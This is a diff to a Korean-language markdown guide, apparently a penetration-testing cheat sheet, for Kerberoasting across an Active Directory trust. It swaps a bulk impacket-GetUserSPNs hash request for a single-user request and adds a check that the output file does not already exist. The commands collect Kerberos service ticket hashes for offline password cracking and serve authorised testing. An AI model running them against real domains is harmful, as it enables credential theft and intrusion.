@@ -61,9 +61,12 @@ impacket-GetUserSPNs -k -no-pass -dc-ip <TARGET> '<DOMAIN>/<USER>'
 
 ### 신뢰 대상 도메인의 SPN과 TGS hash 수집
 
+첫 명령으로 대상 도메인 SPN 소유 계정을 확인한 뒤, 요청할 계정과 기존 파일이 없는 exact 출력 경로를 정한다.
+
 ```bash
 impacket-GetUserSPNs -target-domain <TARGET_TRUST_DOMAIN> '<SOURCE_DOMAIN>/<USER>:<PASSWORD>'
-impacket-GetUserSPNs -request -target-domain <TARGET_TRUST_DOMAIN> '<SOURCE_DOMAIN>/<USER>:<PASSWORD>' -outputfile trusted-domain-kerberoast.hashes
+test ! -e '<TRUST_KERBEROAST_HASH_PATH>'
+impacket-GetUserSPNs -request-user <TARGET_SPN_USER> -target-domain <TARGET_TRUST_DOMAIN> '<SOURCE_DOMAIN>/<USER>:<PASSWORD>' -outputfile '<TRUST_KERBEROAST_HASH_PATH>'
 ```
 
 확인할 출력:
